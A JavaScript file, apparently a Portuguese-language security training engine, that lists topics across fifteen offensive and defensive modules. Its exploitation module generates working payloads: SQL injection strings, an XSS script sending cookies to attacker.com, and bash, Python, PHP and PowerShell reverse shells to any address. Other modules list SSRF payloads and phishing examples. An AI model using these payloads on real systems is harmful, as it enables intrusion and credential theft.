/**
 * HackerAI Engine v3.5 (JS Edition)
 * A comprehensive knowledge base and challenge generator for offensive/defensive security.
 * Based on the Python engine v3.0.
 */

class HackerAIEngine {
    constructor() {
        this.modules = {
            "1": {
                name: "Fundamentos",
                lessons: [
                    {
                        title: "Modelo OSI e TCP/IP - A Base de Tudo",
                        topics: [
                            "Camada Física: Cabos, sinais elétricos, fibra óptica",
                            "Camada de Enlace: MAC addresses, switches, ARP spoofing",
                            "Camada de Rede: IP, roteamento, ICMP, traceroute",
                            "Camada de Transporte: TCP (3-way handshake), UDP",
                            "Camada de Sessão: Sessões NetBIOS, SMB",
                            "Camada de Apresentação: SSL/TLS, codificação",
                            "Camada de Aplicação: HTTP, DNS, FTP, SMTP"
                        ],
                        exercise: {
                            question: "Analise este pacote TCP e identifique os flags: 0x012",
                            answer: "SYN (0x02) + ACK (0x10) = 0x12 - Confirmação de SYN",
                            hint: "Flags TCP: SYN=2, ACK=16, FIN=1, RST=4"
                        }
                    },
                    {
                        title: "Sistemas Operacionais - Alvo e Ferramenta",
                        topics: [
                            "Linux: /etc/passwd, /etc/shadow, permissões SUID",
                            "Windows: SAM, LSASS, tokens de acesso, UAC",
                            "Processos, threads, chamadas de sistema (syscalls)",
                            "Gerenciamento de memória, heap, stack, ASLR"
                        ],
                        commands: {
                            linux: ["nmap", "netcat", "tcpdump", "grep", "find"],
                            windows: ["netstat", "tasklist", "whoami", "powershell"]
                        }
                    }
                ]
            },
            "2": {
                name: "Reconhecimento",
                lessons: [
                    {
                        title: "OSINT - Inteligência de Fontes Abertas",
                        tools: [
                            {name: "Shodan", use: "Busca por dispositivos conectados"},
                            {name: "theHarvester", use: "Coleta de emails/subdomínios"},
                            {name: "Google Dorks", use: "Operadores avançados de busca"}
                        ],
                        dorks: [
                            "site:alvo.com filetype:pdf",
                            "intitle:'index of' 'backup'",
                            "inurl:wp-content/uploads"
                        ]
                    },
                    {
                        title: "Varredura de Redes com Nmap",
                        techniques: [
                            {name: "SYN Scan (-sS)", desc: "Meio handshake, rápido e furtivo"},
                            {name: "UDP Scan (-sU)", desc: "Lento, mas essencial para UDP"},
                            {name: "NSE Scripts (--script)", desc: "Automação de vulnerabilidades"}
                        ],
                        examples: [
                            "nmap -sS -sV -O -p- 192.168.1.0/24",
                            "nmap --script vuln 10.0.0.1"
                        ]
                    }
                ]
            },
            "3": {
                name: "Exploração",
                methods: {
                    generateSQLi: (type = "union") => {
                        const payloads = {
                            basic: "' OR '1'='1",
                            union: "' UNION SELECT 1,2,3,4,5--",
                            blind: "' AND SLEEP(5)--",
                            error: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--"
                        };
                        return payloads[type] || payloads.basic;
                    },
                    generateXSS: (type = "reflected") => {
                        const payloads = {
                            basic: "<script>alert('XSS')</script>",
                            steal_cookie: "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
                            phishing: "<script>document.body.innerHTML = '<h1>Login</h1><input><button>Go</button>';</script>"
                        };
                        return payloads[type] || payloads.basic;
                    },
                    generateReverseShell: (ip, port, lang = "python") => {
                        const shells = {
                            bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
                            python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
                            php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
                            powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});..."`
                        };
                        return shells[lang] || shells.python;
                    }
                }
            },
            "4": {
                name: "Engenharia Social",
                lessons: [
                    {
                        title: "Phishing - A Ameaça Mais Eficaz",
                        techniques: ["Spear Phishing", "Whaling", "Clone Phishing", "Vishing", "Smishing"],
                        example: {
                            from: "suporte@banco-seguro.com",
                            subject: "URGENTE: Atualização Necessária",
                            body: "Clique aqui para verificar sua conta: http://banco-seguro.com/verify"
                        }
                    }
                ]
            },
            "5": {
                name: "Pós-Exploração",
                lessons: [
                    {
                        title: "Escalação de Privilégio Linux",
                        techniques: [
                            {name: "SUID Binaries", cmd: "find / -perm -4000 2>/dev/null"},
                            {name: "Sudo -l", cmd: "sudo -l"},
                            {name: "Capabilities", cmd: "getcap -r / 2>/dev/null"}
                        ]
                    },
                    {
                        title: "Escalação de Privilégio Windows",
                        techniques: [
                            {name: "Unquoted Service Paths", cmd: "wmic service get name,pathname..."},
                            {name: "Token Impersonation", cmd: "JuicyPotato / SeImpersonatePrivilege"}
                        ]
                    }
                ]
            },
            "6": {
                name: "Web Avançado",
                lessons: [
                    {
                        title: "Server-Side Request Forgery (SSRF)",
                        payloads: [
                            "http://127.0.0.1:8080/admin",
                            "file:///etc/passwd",
                            "http://169.254.169.254/latest/meta-data/"
                        ]
                    },
                    {
                        title: "Ataques de Desserialização",
                        vulns: ["PHP", "Java", "Python (pickle)", "Ruby", ".NET"],
                        tools: ["ysoserial", "marshalsec", "PHPGGC"]
                    }
                ]
            },
            "7": {
                name: "Cloud & Containers",
                lessons: [
                    {
                        title: "Enumeração AWS",
                        services: ["S3", "IAM", "EC2", "Lambda", "RDS"],
                        tools: ["awscli", "pacu", "ScoutSuite"]
                    },
                    {
                        title: "Segurança em Docker",
                        attacks: ["Container Escape", "Host Mount", "Registry Attacks"]
                    }
                ]
            },
            "8": {
                name: "Binary Exploitation",
                lessons: [
                    {
                        title: "Buffer Overflow Clássico",
                        concepts: ["Stack layout", "Offset calculation", "Shellcode injection", "ASLR bypass"],
                        tools: ["gdb", "pwntools", "ghidra"]
                    },
                    {
                        title: "Return-Oriented Programming (ROP)",
                        gadgets: "sequências de instruções terminando em ret",
                        tools: ["ROPgadget", "ropper"]
                    }
                ]
            },
            "9": {
                name: "Wireless & IoT",
                lessons: [
                    {
                        title: "Hacking de Redes Wi-Fi",
                        attacks: ["WPA2 Handshake Capture", "Evil Twin", "Deauth Attack", "PMKID Attack"],
                        tools: ["aircrack-ng", "hashcat", "bettercap"]
                    }
                ]
            },
            "10": {
                name: "Defesa & Detecção",
                lessons: [
                    {
                        title: "Sistemas de Detecção (IDS/IPS)",
                        tools: ["Snort", "Suricata", "Zeek", "Wazuh", "YARA"]
                    },
                    {
                        title: "Hardening de Sistemas",
                        linux: ["PermitRootLogin no", "Fail2Ban", "AppArmor/SELinux"],
                        windows: ["LAPS", "AppLocker", "Defender ATP"]
                    }
                ]
            },
            "11": {
                name: "Evasão",
                lessons: [
                    {
                        title: "Bypass de AMSI (Windows)",
                        techniques: ["Memory Patching", "Registry Override", "Reflection"]
                    },
                    {
                        title: "Empacotamento e Criptografia",
                        techniques: ["XOR Encryption", "AES Encryption", "Process Hollowing"]
                    }
                ]
            },
            "12": {
                name: "Active Directory",
                lessons: [
                    {
                        title: "Ataques em AD",
                        attacks: ["Kerberoasting", "AS-REP Roasting", "Golden Ticket", "DCSync"],
                        tools: ["BloodHound", "Impacket", "Mimikatz"]
                    }
                ]
            },
            "13": {
                name: "Criptografia",
                lessons: [
                    {
                        title: "Quebra de Hashes",
                        modes: ["NTLM", "bcrypt", "SHA-512", "Kerberos"],
                        tools: ["hashcat", "john"]
                    }
                ]
            },
            "14": {
                name: "Automação",
                tools: ["Scanner de Portas", "Web Fuzzer", "Brute Forcer"]
            },
            "15": {
                name: "CTF Prático",
                levels: ["Fácil", "Médio", "Difícil"]
            }
        };
    }

    getModule(id) {
        return this.modules[id];
    }
}

window.HackerAIEngine = new HackerAIEngine();
